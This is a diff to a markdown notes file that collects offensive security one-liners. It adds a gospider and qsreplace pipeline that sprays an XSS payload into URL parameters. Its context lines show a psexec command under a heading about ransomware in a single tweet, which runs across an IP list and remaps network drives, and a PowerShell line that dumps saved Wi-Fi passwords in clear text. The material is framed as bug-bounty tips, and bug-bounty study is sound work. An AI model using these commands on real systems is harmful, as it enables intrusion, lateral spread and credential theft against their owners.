@@ -1,4 +1,9 @@
 # notes 
+### More pipe dreams from @KingOfBugBounty 
+
+````
+gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+````
 
 ### The Apple Money Shot - Ransomware in a single tweet from @lordx64 
 ````
@@ -18,7 +23,7 @@ C:\psexec.exe @ip-list.txt -d cmd /c “(net use q: /delete /y &; net use q: \\D
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 ````
 
-### A rival! King Of Tips apparently
+### King Of Tips apparently
 
 https://github.com/KingOfBugbounty/KingOfBugBountyTips
 
